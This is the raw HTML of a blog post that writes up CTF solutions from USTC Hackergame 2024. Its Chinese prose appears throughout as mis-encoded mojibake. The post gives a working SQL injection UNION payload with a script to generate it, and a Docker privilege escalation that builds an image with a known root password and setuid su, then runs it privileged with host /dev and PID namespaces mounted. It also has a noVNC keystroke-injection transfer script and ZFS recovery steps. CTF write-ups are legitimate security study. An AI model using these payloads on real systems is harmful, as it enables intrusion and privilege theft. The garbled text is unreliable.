<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>USTC Hackergame 2024 Writeup | Sparktour's Blog</title><meta name=keywords content="tech"><meta name=description content="è¿™æ˜¯æœ¬äººç¬¬äº”æ¬¡å‚åŠ USTCçš„hackergameäº†ï¼Œæœ¬æ¬¡çš„æ’åç›¸æ¯”ä¸Šæ¬¡ç•¥æœ‰è¿›æ­¥ï¼Œè¿›åˆ°äº†50åå†…ã€‚

PaoluGPT
è§‚å¯Ÿä»£ç æ³¨æ„åˆ°äº†å¯èƒ½å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ï¼š"><meta name=author content="sparktour"><link rel=canonical href=https://blog.sparktour.me/posts/2024/11/14/ustc-hackergame-2024-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF+13Dyqob6ASlTrTye8=" rel="preload stylesheet" as=style><link rel=icon href=https://blog.sparktour.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.sparktour.me/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.sparktour.me/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.sparktour.me/apple-touch-icon.png><link rel=mask-icon href=https://blog.sparktour.me/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh href=https://blog.sparktour.me/posts/2024/11/14/ustc-hackergame-2024-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://blog.sparktour.me/scss/callout.css><link rel=stylesheet href=https://s4.zstatic.net/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-6EJ4YX1XZ8"></script><script>var doNotTrack=!1,dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes";if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6EJ4YX1XZ8")}</script><meta property="og:url" content="https://blog.sparktour.me/posts/2024/11/14/ustc-hackergame-2024-writeup/"><meta property="og:site_name" content="Sparktour's Blog"><meta property="og:title" content="USTC Hackergame 2024 Writeup"><meta property="og:description" content="è¿™æ˜¯æœ¬äººç¬¬äº”æ¬¡å‚åŠ USTCçš„hackergameäº†ï¼Œæœ¬æ¬¡çš„æ’åç›¸æ¯”ä¸Šæ¬¡ç•¥æœ‰è¿›æ­¥ï¼Œè¿›åˆ°äº†50åå†…ã€‚
PaoluGPT è§‚å¯Ÿä»£ç æ³¨æ„åˆ°äº†å¯èƒ½å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ï¼š"><meta property="og:locale" content="zh"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-11-14T18:00:00+00:00"><meta property="article:modified_time" content="2024-11-15T22:52:25+08:00"><meta property="article:tag" content="Tech"><meta property="og:image" content="https://assets.sparktour.me/img/blog/2024/ustc-hackergame-2024-writeup/score.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://assets.sparktour.me/img/blog/2024/ustc-hackergame-2024-writeup/score.png"><meta name=twitter:title content="USTC Hackergame 2024 Writeup"><meta name=twitter:description content="è¿™æ˜¯æœ¬äººç¬¬äº”æ¬¡å‚åŠ USTCçš„hackergameäº†ï¼Œæœ¬æ¬¡çš„æ’åç›¸æ¯”ä¸Šæ¬¡ç•¥æœ‰è¿›æ­¥ï¼Œè¿›åˆ°äº†50åå†…ã€‚

PaoluGPT
è§‚å¯Ÿä»£ç æ³¨æ„åˆ°äº†å¯èƒ½å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ï¼š"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.sparktour.me/posts/"},{"@type":"ListItem","position":2,"name":"USTC Hackergame 2024 Writeup","item":"https://blog.sparktour.me/posts/2024/11/14/ustc-hackergame-2024-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"USTC Hackergame 2024 Writeup","name":"USTC Hackergame 2024 Writeup","description":"è¿™æ˜¯æœ¬äººç¬¬äº”æ¬¡å‚åŠ USTCçš„hackergameäº†ï¼Œæœ¬æ¬¡çš„æ’åç›¸æ¯”ä¸Šæ¬¡ç•¥æœ‰è¿›æ­¥ï¼Œè¿›åˆ°äº†50åå†…ã€‚\nPaoluGPT è§‚å¯Ÿä»£ç æ³¨æ„åˆ°äº†å¯èƒ½å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ï¼š\n","keywords":["tech"],"articleBody":"è¿™æ˜¯æœ¬äººç¬¬äº”æ¬¡å‚åŠ USTCçš„hackergameäº†ï¼Œæœ¬æ¬¡çš„æ’åç›¸æ¯”ä¸Šæ¬¡ç•¥æœ‰è¿›æ­¥ï¼Œè¿›åˆ°äº†50åå†…ã€‚\nPaoluGPT è§‚å¯Ÿä»£ç æ³¨æ„åˆ°äº†å¯èƒ½å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥ï¼š\ndef generate_search_payload(): # æ„é€ æœç´¢æ‰€æœ‰åŒ…å«flagè®°å½•çš„payload # ä½¿ç”¨group_concatå°†å¤šæ¡è®°å½•åˆå¹¶,ç”¨æ¢è¡Œç¬¦åˆ†éš” payload = \"' UNION SELECT 'Flags', group_concat(id || ' | ' || title || ' | ' || contents, char(10)) \" payload += \"FROM messages WHERE contents LIKE '%flag%' OR title LIKE '%flag%' -- \" # URLç¼–ç  encoded_payload = urllib.parse.quote(payload) # æ„é€ å®Œæ•´URL url = f\"/view?conversation_id={encoded_payload}\" return url å¾—åˆ°äº†ä¸€ä¸ªå¦‚ä¸‹çš„queryï¼š\n/view?conversation_id=%27%20UNION%20SELECT%20%27Flags%27%2C%20group_concat%28id%20%7C%7C%20%27%20%7C%20%27%20%7C%7C%20title%20%7C%7C%20%27%20%7C%20%27%20%7C%7C%20contents%2C%20char%2810%29%29%20FROM%20messages%20WHERE%20contents%20LIKE%20%27%25flag%25%27%20OR%20title%20LIKE%20%27%25flag%25%27%20--%20 åœ¨æµè§ˆå™¨é‡Œç²˜è´´è¿›å»å¾—åˆ°çš„ç½‘é¡µé‡Œæœç´¢flagå°±èƒ½æ‰¾åˆ°ä¸¤ä¸ªå°é¢˜çš„flagäº†ã€‚\nå¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼ mod16 å‚è€ƒwikipediaçš„æ•´é™¤è§„åˆ™ï¼Œåšäº†ä¸€ä¸ªåŒ¹é…ï¼ˆåªåŒ¹é…äº†1ï¼Œ2ï¼Œ4ï¼Œè€ƒè™‘åˆ°éšæœºåˆ°å››ä½æ•°ä»¥ä¸‹çš„æ¦‚ç‡å¾ˆå°ï¼‰ï¼š\nåƒä½æ•°æ˜¯å¶æ•°æ—¶ï¼Œæœ«ä¸‰ä½èƒ½è¢«16æ•´é™¤ã€‚ 25ä¸‡4176ï¼šåƒä½æ•°4æ˜¯å¶æ•°ï¼Œæœ«ä¸‰ä½176ï¼Œèƒ½è¢«16æ•´é™¤ã€‚ åƒä½æ•°æ˜¯å¥‡æ•°æ—¶ï¼Œæœ«ä¸‰ä½åŠ 8èƒ½è¢«16æ•´é™¤ã€‚ 3408ï¼šåƒä½æ•°3æ˜¯å¥‡æ•°ï¼Œæœ«ä¸‰ä½408ï¼‹8ï¼416ï¼Œèƒ½è¢«16æ•´é™¤ã€‚ æœ«ä¸¤ä½ä¸å…¶ä½™ä½ä¹˜4ç›¸åŠ ï¼Œå…¶ç»“æœèƒ½è¢«16æ•´é™¤ã€‚ 176ï¼š1Ã—4ï¼‹76ï¼80ï¼Œ1168ï¼š11Ã—4ï¼‹68ï¼112ï¼Œä¸¤è€…éƒ½èƒ½è¢«16æ•´é™¤ã€‚ æœ«å››ä½èƒ½è¢«16æ•´é™¤ã€‚ 15ä¸‡7648ï¼šæœ«å››ä½7648èƒ½è¢«16æ•´é™¤ã€‚ æ­£åˆ™çš„ç®€åŒ–ç‰ˆæœ¬ æœ€åä¼šå¾—åˆ°ä¸€ä¸ªå¾ˆé•¿çš„regexï¼ˆå› ä¸ºç©·ä¸¾äº†10000ä»¥å†…å¯ä»¥è¢«16æ•´é™¤çš„æ•°ï¼‰\n(0|1|2|3|4|5|6|7|8|9)*((0|2|4|6|8)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992)|(1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984)|0000|0016|0032|0048|0064|0080|0096|0112|0128|0144|0160|0176|0192|0208|0224|0240|0256|0272|0288|0304|0320|0336|0352|0368|0384|0400|0416|0432|0448|0464|0480|0496|0512|0528|0544|0560|0576|0592|0608|0624|0640|0656|0672|0688|0704|0720|0736|0752|0768|0784|0800|0816|0832|0848|0864|0880|0896|0912|0928|0944|0960|0976|0992|1008|1024|1040|1056|1072|1088|1104|1120|1136|1152|1168|1184|1200|1216|1232|1248|1264|1280|1296|1312|1328|1344|1360|1376|1392|1408|1424|1440|1456|1472|1488|1504|1520|1536|1552|1568|1584|1600|1616|1632|1648|1664|1680|1696|1712|1728|1744|1760|1776|1792|1808|1824|1840|1856|1872|1888|1904|1920|1936|1952|1968|1984|2000|2016|2032|2048|2064|2080|2096|2112|2128|2144|2160|2176|2192|2208|2224|2240|2256|2272|2288|2304|2320|2336|2352|2368|2384|2400|2416|2432|2448|2464|2480|2496|2512|2528|2544|2560|2576|2592|2608|2624|2640|2656|2672|2688|2704|2720|2736|2752|2768|2784|2800|2816|2832|2848|2864|2880|2896|2912|2928|2944|2960|2976|2992|3008|3024|3040|3056|3072|3088|3104|3120|3136|3152|3168|3184|3200|3216|3232|3248|3264|3280|3296|3312|3328|3344|3360|3376|3392|3408|3424|3440|3456|3472|3488|3504|3520|3536|3552|3568|3584|3600|3616|3632|3648|3664|3680|3696|3712|3728|3744|3760|3776|3792|3808|3824|3840|3856|3872|3888|3904|3920|3936|3952|3968|3984|4000|4016|4032|4048|4064|4080|4096|4112|4128|4144|4160|4176|4192|4208|4224|4240|4256|4272|4288|4304|4320|4336|4352|4368|4384|4400|4416|4432|4448|4464|4480|4496|4512|4528|4544|4560|4576|4592|4608|4624|4640|4656|4672|4688|4704|4720|4736|4752|4768|4784|4800|4816|4832|4848|4864|4880|4896|4912|4928|4944|4960|4976|4992|5008|5024|5040|5056|5072|5088|5104|5120|5136|5152|5168|5184|5200|5216|5232|5248|5264|5280|5296|5312|5328|5344|5360|5376|5392|5408|5424|5440|5456|5472|5488|5504|5520|5536|5552|5568|5584|5600|5616|5632|5648|5664|5680|5696|5712|5728|5744|5760|5776|5792|5808|5824|5840|5856|5872|5888|5904|5920|5936|5952|5968|5984|6000|6016|6032|6048|6064|6080|6096|6112|6128|6144|6160|6176|6192|6208|6224|6240|6256|6272|6288|6304|6320|6336|6352|6368|6384|6400|6416|6432|6448|6464|6480|6496|6512|6528|6544|6560|6576|6592|6608|6624|6640|6656|6672|6688|6704|6720|6736|6752|6768|6784|6800|6816|6832|6848|6864|6880|6896|6912|6928|6944|6960|6976|6992|7008|7024|7040|7056|7072|7088|7104|7120|7136|7152|7168|7184|7200|7216|7232|7248|7264|7280|7296|7312|7328|7344|7360|7376|7392|7408|7424|7440|7456|7472|7488|7504|7520|7536|7552|7568|7584|7600|7616|7632|7648|7664|7680|7696|7712|7728|7744|7760|7776|7792|7808|7824|7840|7856|7872|7888|7904|7920|7936|7952|7968|7984|8000|8016|8032|8048|8064|8080|8096|8112|8128|8144|8160|8176|8192|8208|8224|8240|8256|8272|8288|8304|8320|8336|8352|8368|8384|8400|8416|8432|8448|8464|8480|8496|8512|8528|8544|8560|8576|8592|8608|8624|8640|8656|8672|8688|8704|8720|8736|8752|8768|8784|8800|8816|8832|8848|8864|8880|8896|8912|8928|8944|8960|8976|8992|9008|9024|9040|9056|9072|9088|9104|9120|9136|9152|9168|9184|9200|9216|9232|9248|9264|9280|9296|9312|9328|9344|9360|9376|9392|9408|9424|9440|9456|9472|9488|9504|9520|9536|9552|9568|9584|9600|9616|9632|9648|9664|9680|9696|9712|9728|9744|9760|9776|9792|9808|9824|9840|9856|9872|9888|9904|9920|9936|9952|9968|9984) mod13 åœ¨Stack Exchangeä¸Šæ‰¾åˆ°äº†è¿™ä¸ªç­”æ¡ˆï¼Œå¹¶ä¸”å¾®è°ƒäº†ä¸€ä¸‹ï¼ŒæŠŠç”Ÿæˆçš„æ­£åˆ™é‡Œçš„(0+)?æ¢æˆäº†0*ä»¥æ»¡è¶³é¢˜ç›®çš„è¦æ±‚ã€‚\nfunction gen(b, base) { var states = nfa(b, base) for (var i = 0; i \u003c states.length; i++) states = reduce(states, i); return states[0][0] != 'phi' \u0026\u0026 new RegExp('^' + wrap(states[0][0]) + '$'); } function test(reg, base) { if (!base) base = 10; var x = []; for (var i = 0; i \u003c 100; i++) x.push(i); return x.map(function (a) {return a.toString(base)}).filter(reg.test.bind(reg)).map(function (a) {return parseInt(a, base)}) } function nfa(b, base) { if (!base) base = 10; var states = []; for (var i = 0; i \u003c b; i++) { states[i] = []; for (var j = 0; j \u003c b; j++) states[i][j] = []; } for (var i = 0; i \u003c b; i++) for (var n = 0; n \u003c base; n++) states[i][(i * base + n) % b].push(n.toString()); for (var i = 0; i \u003c b; i++) for (var j = 0; j \u003c b; j++) states[i][j] = states[i][j].length \u003e 1 ? '[' + states[i][j].join('') + ']' : (states[i][j][0] || 'phi'); return states; } // http://www.cs.umbc.edu/~squire/cs451_l7.html function reduce(states, n) { var s = states.length; var reduced = []; for (var i = 0; i \u003c s; i++) { reduced[i] = []; for (var j = 0; j \u003c s; j++) { // reduced[i][j] = wrap(states[i][n] + wrap(states[n][n]) + '*' + states[n][j] + '|' + states[i][j]); reduced[i][j] = ''; if (states[i][n] == 'phi' || states[n][j] == 'phi') { reduced[i][j] = states[i][j]; continue; } if (states[i][n] != states[n][n]) reduced[i][j] += wrap(states[i][n]); if (states[n][n] != 'phi') { reduced[i][j] += wrap(states[n][n]); if (states[i][n] == states[n][n] \u0026\u0026 states[n][j] == states[n][n]) reduced[i][j] += wrap(states[n][n]); if (states[i][n] == states[n][n] || states[n][j] == states[n][n]) reduced[i][j] += '+'; else reduced[i][j] += '*'; } if (states[n][j] != states[n][n]) reduced[i][j] += wrap(states[n][j]); reduced[i][j] = states[i][j] == 'phi' ? wrap(reduced[i][j]) : alternate(reduced[i][j], states[i][j]); } } return reduced; } function matching(x, open, close) { // Test if the parens are actually matching if ('(['.indexOf(x.charAt(open)) != -1 \u0026\u0026 ')]'.indexOf(x.charAt(close)) != -1) { var count = 0; for (var i = open; i \u003c= close; i++) { if ('(['.indexOf(x.charAt(i)) != -1) count++; else if (')]'.indexOf(x.charAt(i)) != -1) { count--; if (count == 0) return i == close; } } } return false; } function wrap(x) { if (x.length \u003c 2 || matching(x, 0, x.length - 1)) return x; return '(' + x + ')'; } function optional(cond) { if (matching(cond, 0, cond.length - 2)) { var op = cond.charAt(cond.length - 1); if (op == '+') return cond.slice(0, -1) + '*'; else if (op == '*' || op == '?') return cond; } else if (matching(cond, 0, cond.length - 1)) return optional(cond.slice(1, -1)); return wrap(cond) + '?'; } function alternate(cond1, cond2) { cond2 = wrap(cond2); var index = cond1.indexOf(cond2); var len = cond2.length; var cond = ''; if (index == 0) { var op = cond1.charAt(len); if (op == '*') cond = cond2 + '+' + optional(cond1.slice(len)); else if (op == '+') cond = cond1; else cond = cond2 + optional(cond1.slice(len)); } else if (index == cond1.length - len) cond = optional(cond1.slice(0, index)) + cond2; else if (cond1.length == 1 \u0026\u0026 cond2.length == 1) cond = '[' + cond1 + cond2 + ']'; else cond = cond1 + '|' + cond2; return wrap(cond); } regex = gen(13, 2) //regex (0+)? with 0* regex = regex.toString().replace(/\\(0\\+\\)/g, '0*') //remove head /^ and tail $/ before use console.log(regex) flag{pow3rful_r3gular_expressi0n_medium_b696342189} æ— æ³•è·å¾—çš„ç§˜å¯† vmåªèƒ½ç”¨novncè®¿é—®ï¼Œå¹¶ä¸”ä¸èƒ½æ‹–æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½å…±äº«å‰ªè´´æ¿ï¼Œè¯»å–ä¿¡æ¯ä¹Ÿåªèƒ½é€šè¿‡å±å¹•ï¼Œå†™å…¥ä¿¡æ¯åªèƒ½é€šè¿‡é”®ç›˜è¾“å…¥å’Œé¼ æ ‡ã€‚é¦–å…ˆæˆ‘ä»¬å¯ä»¥æ€è€ƒä¸€ä¸‹å¦‚ä½•åˆ©ç”¨vmé‡Œå·²æœ‰çš„è½¯ä»¶ã€‚ç»è¿‡è§‚å¯Ÿï¼Œé™¤äº†å¸¸è§çš„å‘½ä»¤è¡Œè½¯ä»¶ï¼Œè¿™ä¸ªæœºå™¨é‡Œæœ‰pythonï¼Œä¹Ÿæœ‰æµè§ˆå™¨ï¼ˆæ„å‘³ç€è‡³å°‘èƒ½è¿è¡Œpythonå’Œjavascriptä»£ç ï¼‰ã€‚\nç¬”è€…åœ¨å‡ å‘¨å‰æ­£å¥½çœ‹åˆ°è¿‡ä¸€ä½å¼€å‘è€…å¼€å‘è¿‡ä¸€ä¸ªåä¸ºqrsçš„ã€Œç½‘é¡µä¼ è¾“æ•°æ®ã€çš„åŒ…ã€‚è¿™ä¸ªåŒ…é€šè¿‡æŠŠæ–‡ä»¶ç¼–ç è¿›äºŒç»´ç ï¼Œç„¶åç”¨å–·æ³‰ç çš„æ–¹å¼æŠŠäºŒç»´ç æ˜¾ç¤ºåœ¨å±å¹•ä¸Šæ¥è®©å±å¹•å¦ä¸€è¾¹çš„ã€Œå®¢æˆ·ç«¯ã€æ”¶å–ä¿¡æ¯ã€‚ç¬”è€…éšå³å°è¯•æŠŠqrsçš„ç½‘é¡µç¼–è¯‘å‡ºæ¥ï¼Œå»æ‰äº†å›¾ç‰‡ï¼ˆå‡å°ä½“ç§¯ï¼‰ï¼Œå‹ç¼©åbase64ã€‚\nGZIP=-9 tar -czvf public.tar.gz public base64 -i public.tar.gz \u003e public_b64.txt 156K Nov 2 20:33 public.tar.gz 209K Nov 2 20:33 public_b64.txt è¿™æ—¶è¿™ä¸ªbase64åçš„æ–‡ä»¶å¤§æ¦‚æœ‰209kï¼ˆå¤§æ¦‚20å¤šä¸‡ä¸ªå­—ç¬¦ï¼‰ï¼Œå¦‚æœæ‹¿é”®ç›˜å®è¾“å…¥çš„è¯æ¯ç§’çš„è¾“å…¥é€Ÿåº¦å¤§æ¦‚è¦åˆ°300å¤šä¸ªå­—ç¬¦ï¼Œè¿™æ˜¯æ­£å¸¸çš„é”®ç›˜å®åšä¸åˆ°çš„ã€‚\néšåç¬”è€…æ³¨æ„åˆ°æˆ‘å¯ä»¥ç›´æ¥å¾€noVNC_keyboardinputé‡Œå†™å…¥æ•°æ®å†å‘é€ï¼Œåœ¨ä¿è¯novncä¸å¡æ­»çš„æƒ…å†µä¸‹ï¼Œå¤§æ¦‚æ¯æ¬¡èƒ½å‘é€1ä¸‡ä¸ªå­—ç¬¦ï¼ˆä¸¤æ¬¡å‘é€ä¹‹é—´æœ€å¥½éš”10ç§’å·¦å³ï¼Œè®©ç¼“å†²åŒºé‡Œçš„è¾“å…¥èƒ½å¤Ÿå®Œå…¨æ‰§è¡Œï¼‰ï¼Œå› æ­¤åœ¨llmçš„è¾…åŠ©ä¸‹å†™äº†ä»¥ä¸‹çš„ä¼ è¾“jsï¼ˆç²˜è´´è¿›æµè§ˆå™¨çš„consoleå³å¯ä½¿ç”¨ï¼‰\nasync function appendToFile(text, chunkSize = 10000, pauseDuration = 10000) { const input = document.getElementById('noVNC_keyboardinput'); if (!input) { console.error(\"æ‰¾ä¸åˆ°é”®ç›˜è¾“å…¥å…ƒç´ \"); return; } // è®¡ç®—æ€»å—æ•° const totalChunks = Math.ceil(text.length / chunkSize); console.log(`æ€»å…±éœ€è¦å‘é€ ${totalChunks} å—æ•°æ®ï¼Œæ¯å— ${chunkSize} å­—ç¬¦`); // åˆ›å»ºè¿›åº¦æ˜¾ç¤ºå…ƒç´  const progressDiv = document.createElement('div'); progressDiv.style.cssText = ` position: fixed; top: 10px; right: 10px; background: rgba(0, 0, 0, 0.8); color: white; padding: 10px; border-radius: 5px; font-family: monospace; z-index: 9999; `; document.body.appendChild(progressDiv); // åˆ†å—å¤„ç† for (let i = 0; i \u003c text.length; i += chunkSize) { const chunk = text.slice(i, i + chunkSize); const currentChunk = Math.floor(i / chunkSize) + 1; // æ›´æ–°è¿›åº¦æ˜¾ç¤º const progress = ((i + chunk.length) / text.length * 100).toFixed(2); progressDiv.innerHTML = ` è¿›åº¦: ${progress}%\nå½“å‰å—: ${currentChunk}/${totalChunks}\nå·²ä¼ è¾“: ${i + chunk.length} / ${text.length} å­—ç¬¦`; // æ„é€ echoå‘½ä»¤ // ä½¿ç”¨-nå‚æ•°é¿å…æ¢è¡Œç¬¦ï¼Œä½¿ç”¨å•å¼•å·é¿å…ç‰¹æ®Šå­—ç¬¦é—®é¢˜ const escapedChunk = chunk.replace(/'/g, \"'\\\\''\"); const command = `echo -n '${escapedChunk}' \u003e\u003e 1.txt\\n`; // å‘é€å‘½ä»¤ input.focus(); input.value = command; input.dispatchEvent(new Event('input', { bubbles: true, cancelable: true, })); // æ¸…ç©ºè¾“å…¥æ¡† await new Promise(resolve =\u003e setTimeout(() =\u003e { input.value = ''; resolve(); }, 100)); // å¦‚æœä¸æ˜¯æœ€åä¸€å—ï¼Œåˆ™æš‚åœ if (i + chunkSize \u003c text.length) { // æ˜¾ç¤ºå€’è®¡æ—¶ const startTime = Date.now(); const countDown = setInterval(() =\u003e { const remainingTime = Math.ceil((pauseDuration - (Date.now() - startTime)) / 1000); if (remainingTime \u003e 0) { progressDiv.innerHTML = ` è¿›åº¦: ${progress}%\nå½“å‰å—: ${currentChunk}/${totalChunks}\nå·²ä¼ è¾“: ${i + chunk.length} / ${text.length} å­—ç¬¦\nç­‰å¾…ä¸‹ä¸€å—: ${remainingTime}ç§’`; } }, 1000); await new Promise(resolve =\u003e setTimeout(() =\u003e { clearInterval(countDown); resolve(); }, pauseDuration)); } } // å®Œæˆåæ˜¾ç¤ºéªŒè¯å‘½ä»¤ const verifyCommand = \"wc -c 1.txt\\n\"; input.focus(); input.value = verifyCommand; input.dispatchEvent(new Event('input', { bubbles: true, cancelable: true, })); // ä¹Ÿæ˜¾ç¤ºåŸå§‹é•¿åº¦ï¼Œæ–¹ä¾¿æ¯”å¯¹ console.log(`åŸå§‹å­—ç¬¦ä¸²é•¿åº¦: ${text.length}`); // ç­‰å¾…3ç§’åç§»é™¤è¿›åº¦æ˜¾ç¤º await new Promise(resolve =\u003e setTimeout(resolve, 3000)); progressDiv.remove(); } // ä½¿ç”¨æ–¹æ³•ï¼š // 0. é¦–å…ˆæ¸…ç©ºæˆ–åˆ›å»ºæ–‡ä»¶ï¼š // echo -n \u003e 1.txt // 1. ç„¶åå¼€å§‹ä¼ è¾“ï¼š // appendToFile(ä½ çš„base64å­—ç¬¦ä¸²); æŠŠç½‘é¡µä¼ è¾“è¿›å»ä¹‹åï¼Œè§£ç base64ï¼Œè§£å‹å‡ºç½‘é¡µä¹‹åç”¨pythonå¼€ä¸ªhttpæœåŠ¡å™¨hostç½‘é¡µå³å¯ï¼š\nbase64 -d 1.txt \u003e public.tar.gz tar -xvf public.tar.gz cd public python -m http.server 8000 æ‰“å¼€ç½‘é¡µå¯åŠ¨äºŒç»´ç æ˜¾ç¤ºåï¼Œæ‹¿ä¸€ä¸ªæ‰‹æœºè¯»å¤§æ¦‚2-3åˆ†é’Ÿå°±å¯ä»¥æ‹¿åˆ°æ•°æ®äº†ï¼š\nDocker for Everyone Plus No Enough Privilege NOPASSWD: /usr/bin/docker run --rm -u 1000\\:1000 *, /usr/bin/docker image load, !/usr/bin/docker * -u0*, !/usr/bin/docker * -u?0*, !/usr/bin/docker * --user?0*, !/usr/bin/docker * -ur*, !/usr/bin/docker * -u?r*, !/usr/bin/docker * --user?r*, åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ï¼Œä½œè€…æåˆ°äº†å¯ä»¥è®©dockeré‡Œçš„ç”¨æˆ·ç”¨suææƒåˆ°rootï¼Œå°±å¯ä»¥å¹²å’Œdocker run --rmä¹‹åä¸€æ ·çš„äº‹æƒ…äº†ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åˆ¶ä½œä¸€ä¸ªç®€å•çš„imageï¼š\nFROM busybox:latest # Create a new user RUN adduser -D -u 1000 user \u0026\u0026 \\ # Set root password echo \"root:root\" | chpasswd \u0026\u0026 \\ # Make sure su has correct permissions chmod u+s /bin/su # Switch to the new user USER user WORKDIR /home/user CMD [\"/bin/sh\"] ç”¨rzä¼ åˆ°é¢˜ç›®ç¯å¢ƒé‡Œè¿è¡Œå³å¯ã€‚\ndockerv:/tmp$ sudo docker run --rm -u 1000:1000 -v /flag:/flag -v /dev:/dev --pr ivileged --pid=host --cap-add=SYS_ADMIN reader_busybox1 whoami user dockerv:/tmp$ sudo docker run --rm -u 1000:1000 -it -v /flag:/flag -v /dev:/dev --privileged --pid=host --cap-add=SYS_ADMIN reader_busybox1 ~ $ su root Password: /home/user # cat /flag flag{dONT_1OAD_uNTRusT3D_1ma6e_253cb5a83d_plz!} ZFS æ–‡ä»¶æ¢å¤ Text File æŒ‚ä¸Šç›˜ä¹‹åå¯ä»¥å…ˆç”¨zdb -vvv hg2024çœ‹ä¸€ä¸‹ç›˜çš„logï¼Œå¯ä»¥æ³¨æ„åˆ°åˆ›å»ºzfsçš„äººæ˜¯ç”¨çš„zpool create -o ashift=9 -O atime=off -O compression=gzip -O redundant_metadata=none -O xattr=off hg2024 /dev/loop0åˆ›å»ºçš„zpoolï¼Œå¹¶ä¸”åœ¨åˆ æ‰æ–‡ä»¶ä¹‹å‰ç»™ç›˜æ‰“äº†ä¸€ä¸ªå¿«ç…§hg2024/data@mysnapï¼ˆ2024-10-23.21:37:22 ioctl snapshotï¼‰ï¼Œä¹‹åå‚è€ƒè¿™ä¸ªissueï¼Œç”¨zfs send -R hg2024/data@mysnap | zstream dump -d \u003e zdump.txtï¼Œåœ¨zdump.txté‡Œçœ‹èƒ½æ‰¾åˆ°flag1ã€‚\n6c 75 61 69 78 6d 70 72 70 67 68 61 71 6a 66 6c luai xmpr pgha qjfl checksum = 2388d63a19/37aec6ae4719/393e10dd9e0ed3/2c106546000e7e31 WRITE object = 2 type = 19 checksum type = 2 compression type = 0 flags = 0 offset = 4096 logical_size = 4096 compressed_size = 0 payload_size = 4096 props = 0 salt = 0000000000000000 iv = 000000000000000000000000 mac = 00000000000000000000000000000000 61 67 7b 70 31 41 49 6e 4e 4e 6d 6d 6e 6e 6d 6d ag{p 1AIn NNmm nnmm 6e 74 45 78 78 74 5f 35 30 65 61 73 79 7e 72 31 ntEx xt_5 0eas y~r1 67 68 74 3f 7e 7d 0a 00 00 00 00 00 00 00 00 00 ght? ~}.. .... .... flag{p1AInNNmmnnmmntExxt_50easy~r1ght?~}\nShell Script ç”¨dd if=/dev/loop0 bs=1M | strings -n 8æå–æ•´ä¸ªç›˜çš„å¯è¯»æ•°æ®ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªè„šæœ¬ï¼š\n#!/bin/sh flag_key=\"hg2024_$(stat -c %X.%Y flag1.txt)_$(stat -c %X.%Y \"$0\")_zfs\" echo \"46c518b175651d440771836987a4e7404f84b20a43cc18993ffba7a37106f508 -\" \u003e /tmp/sha256sum.txt printf \"%s\" \"$flag_key\" | sha256sum --check /tmp/sha256sum.txt || exit 1 printf \"flag{snapshot_%s}\\n\" \"$(printf \"%s\" \"$flag_key\" | sha1sum | head -c 32)\" é‚£ç›®æ ‡å°±æ˜¯æ‰¾flag1æ–‡ä»¶çš„atimeå’Œmtimeã€‚æˆ‘ä»¬å†å›å»ç¿»ä¸€ä¸‹zdb -vvv hg2024çš„ç»“æœï¼ˆå¤§æ¦‚åœ¨è¾“å‡ºçš„1470è¡Œå·¦å³ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°object2å’Œobject3éƒ½æ¯”è¾ƒå¯ç–‘ï¼š\nObject lvl iblk dblk dsize dnsize lsize %full type 2 2 128K 4K 3.50K 512 8K 100.00 ZFS plain file 176 bonus System attributes dnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED dnode maxblkid: 1 uid 0 gid 0 atime\tThu Mar 9 23:56:50 2006 